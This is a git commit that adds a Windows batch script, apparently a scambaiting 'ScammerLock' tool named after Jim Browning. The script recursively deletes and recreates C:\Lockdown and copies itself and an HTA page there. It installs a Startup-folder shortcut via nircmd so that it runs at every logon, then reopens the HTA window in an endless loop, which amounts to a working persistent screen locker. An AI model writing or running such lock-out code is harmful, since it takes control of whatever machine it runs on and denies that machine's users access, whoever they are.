89f4edb060c275f0c04135aa0c1a46850d105204
AnonymousUser98 <161506704+AnonymousUser98@users.noreply.github.com>
2025-11-19 11:03:34 -0800

    Add files via upload
    Add Jim Browning HTA screen

---
+++ HTA_JimBrowning/lockdown.bat
@@ -0,0 +1,20 @@
+@echo off
+cls
+
+if exist "C:\Lockdown" (
+    del /S C:\Lockdown\*
+    rmdir C:\Lockdown
+)
+
+mkdir C:\Lockdown
+copy %0 C:\Lockdown > nul
+copy index.hta C:\Lockdown > nul
+copy JBLogoUpscaled.png C:\Lockdown > nul
+nircmd.exe shortcut "C:\Lockdown\lockdown.bat" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" "ScammerLock-HTA"
+
+echo Initiating system lockdown...
+echo Lockdown mode is now active.
+
+:open
+start "" /wait "index.hta"
+goto :open
